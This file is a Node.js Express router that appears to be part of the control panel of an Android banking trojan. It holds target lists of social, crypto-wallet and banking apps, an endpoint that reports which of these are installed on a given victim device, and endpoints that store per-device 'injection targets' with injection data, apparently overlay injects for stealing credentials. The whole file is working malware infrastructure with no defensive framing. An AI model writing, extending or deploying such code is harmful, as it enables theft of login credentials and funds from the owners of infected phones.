const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

// Social apps
const SOCIAL_APPS = [
  { package: 'com.tencent.mm', name: '微信', category: 'social' },
  { package: 'com.zhiliaoapp.musically', name: 'TikTok', category: 'social' },
  { package: 'com.xingin.xhs', name: '小红书', category: 'social' },
  { package: 'com.tencent.mobileqq', name: 'QQ', category: 'social' },
  { package: 'com.taobao.taobao', name: '淘宝', category: 'social' },
  { package: 'com.sina.weibo', name: '微博', category: 'social' },
  { package: 'com.viber.voip', name: 'Viber', category: 'social' },
  { package: 'com.vkontakte.android', name: 'VK', category: 'social' },
  { package: 'com.google.android.gm', name: 'Gmail', category: 'social' },
  { package: 'com.facebook.katana', name: 'Facebook', category: 'social' },
  { package: 'com.instagram.android', name: 'Instagram', category: 'social' },
  { package: 'com.discord', name: 'Discord', category: 'social' },
  { package: 'com.snapchat.android', name: 'Snapchat', category: 'social' },
  { package: 'com.twitter.android', name: 'X', category: 'social' },
  { package: 'com.pinterest', name: 'Pinterest', category: 'social' },
  { package: 'com.whatsapp', name: 'WhatsApp', category: 'social' },
  { package: 'xyz.blueskyweb.app', name: 'Bluesky', category: 'social' },
  { package: 'im.vector.app', name: 'Element', category: 'social' }
];

// Crypto apps
const CRYPTO_APPS = [
  { package: 'com.binance.dev', name: 'Binance', category: 'crypto' },
  { package: 'com.coinbase.android', name: 'Coinbase', category: 'crypto' },
  { package: 'io.metamask', name: 'Metamask', category: 'crypto' },
  { package: 'com.bitget.exchange', name: 'Bitget', category: 'crypto' },
  { package: 'app.phantom', name: 'Phantom', category: 'crypto' },
  { package: 'com.wallet.crypto.trustapp', name: 'Trust Wallet', category: 'crypto' },
  { package: 'com.moonpay', name: 'Moonpay', category: 'crypto' },
  { package: 'exodusmovement.exodus', name: 'Exodus', category: 'crypto' },
  { package: 'trade.dydx', name: 'DYDX', category: 'crypto' },
  { package: 'com.liberty.jaxx', name: 'JAXX Liberty', category: 'crypto' },
  { package: 'com.bybit.app', name: 'Bybit', category: 'crypto' },
  { package: 'com.huobi.global', name: 'HTX', category: 'crypto' },
  { package: 'com.okinc.okex', name: 'OKX', category: 'crypto' },
  { package: 'io.atomicwallet', name: 'Atomic', category: 'crypto' },
  { package: 'piuk.blockchain.android', name: 'Blockchain.com', category: 'crypto' },
  { package: 'com.coinomi.wallet', name: 'Coinomi', category: 'crypto' },
  { package: 'com.crypto.mobile', name: 'Crypto.com', category: 'crypto' },
  { package: 'com.microsoft.emmx', name: 'Edge', category: 'crypto' }
];

// Finance apps
const FINANCE_APPS = [
  { package: 'com.airstar.bank', name: 'AirStar', category: 'finance' },
  { package: 'com.eg.android.AlipayGphone', name: 'Ali Pay', category: 'finance' },
  { package: 'com.boc.bocmbci', name: 'BOC', category: 'finance' },
  { package: 'com.hsbc.hsbcsg', name: 'HSBC Singapore', category: 'finance' },
  { package: 'com.chase.sig.android', name: 'Chase', category: 'finance' },
  { package: 'com.revolut.revolut', name: 'Revolut', category: 'finance' },
  { package: 'by.alfabank.alfapay', name: 'Alfa Bank Belarus', category: 'finance' },
  { package: 'com.paypal.android.p2pmobile', name: 'Paypal', category: 'finance' },
  { package: 'com.google.android.apps.walletnfcrel', name: 'Google Wallet', category: 'finance' },
  { package: 'com.samsung.android.spay', name: 'Samsung Wallet', category: 'finance' },
  { package: 'com.ally.MobileBanking', name: 'AllyBank', category: 'finance' },
  { package: 'com.bluevine.business', name: 'BluevineBank', category: 'finance' },
  { package: 'com.capitalone.mobile', name: 'CapitalOne', category: 'finance' },
  { package: 'com.chime.bank', name: 'ChimeBank', category: 'finance' },
  { package: 'com.creditonebank.mobile', name: 'CreditOne', category: 'finance' },
  { package: 'com.currencyfair', name: 'CurrencyFair', category: 'finance' },
  { package: 'com.discover.mobile', name: 'DiscoverBank', category: 'finance' },
  { package: 'com.greenfi.app', name: 'GREENFI', category: 'finance' }
];

router.get('/targets/:deviceId', authMiddleware, async (req, res) => {
  const { category } = req.query;
  let apps = [...SOCIAL_APPS, ...CRYPTO_APPS, ...FINANCE_APPS];
  if (category) apps = apps.filter(a => a.category === category);

  // Check which are installed
  const installed = await db.query(
    'SELECT package_name FROM installed_apps WHERE device_id = (SELECT id FROM devices WHERE device_id = $1)',
    [req.params.deviceId]
  );
  const installedSet = new Set(installed.rows.map(r => r.package_name));

  res.json(apps.map(a => ({ ...a, installed: installedSet.has(a.package) })));
});

router.get('/device/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT * FROM injection_targets WHERE device_id = (SELECT id FROM devices WHERE device_id = $1)`,
    [req.params.deviceId]
  );
  res.json(result.rows);
});

router.post('/device/:deviceId', authMiddleware, async (req, res) => {
  const { appPackage, appName, category, injectionData } = req.body;
  const result = await db.query(
    `INSERT INTO injection_targets (device_id, app_package, app_name, category, injection_data, is_injected)
     VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, true)
     ON CONFLICT DO NOTHING RETURNING *`,
    [req.params.deviceId, appPackage, appName, category, JSON.stringify(injectionData)]
  );
  res.json(result.rows[0]);
});

module.exports = router;
